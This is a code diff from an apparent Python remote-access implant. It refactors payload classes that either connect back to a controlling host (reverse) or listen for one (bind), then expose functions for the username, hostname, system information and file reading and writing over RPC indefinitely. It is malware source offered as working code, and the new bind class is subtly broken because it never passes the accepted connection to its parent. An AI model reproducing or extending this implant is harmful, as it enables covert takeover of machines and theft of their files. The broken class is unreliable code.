@@ -25,20 +25,7 @@ class Payload:
     def __init__(self, sock):
         self.sock = sock
         self.connection = connection.Connection(self.sock)
-        self.rpc_handler = ClientRPCHandler()
-
-    @classmethod
-    def connect(cls, addr):
-        sock = socket.create_connection(addr)
-        return cls(sock)
-
-    @classmethod
-    def bind(cls, addr):
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind(addr)
-        server.listen(1)
-        client, _ = server.accept()
-        return cls(client)
+        self.rpc_handler = PayloadRPCHandler()
 
     def __enter__(self):
         return self
@@ -57,6 +44,22 @@ class Payload:
 
     def register_instance(self, *args, **kwargs):
         self.rpc_handler.register_instance(*args, **kwargs)
+
+
+class ReversePayload(Payload):
+    
+    def __init__(self, addr):
+        sock = socket.create_connection(addr)
+        super().__init__(sock)
+
+
+class BindPayload(Payload):
+    
+    def __init__(self, addr):
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.bind(addr)
+        server.listen(1)
+        client, _ = server.accept()
 
 
 class BindClient(socketserver.TCPServer):
@@ -98,7 +101,7 @@ class FileService(FileOpener, FileReader, FileWriter):
 def _linux_connect(args):
     host, port = addr = args.host, args.port
 
-    with ReverseClient.connect(addr) as client:
+    with ReversePayload(addr) as payload:
         funcs = [
                 get_username,
                 get_hostname,
@@ -110,10 +113,10 @@ def _linux_connect(args):
                 uname,
         ]
         for f in funcs:
-            client.register_function(f)
-        client.register_instance(FileService())
+            payload.register_function(f)
+        payload.register_instance(FileService())
         try:
-            client.serve_forever()
+            payload.serve_forever()
         except connection.ConnectionClosed:
             pass
 
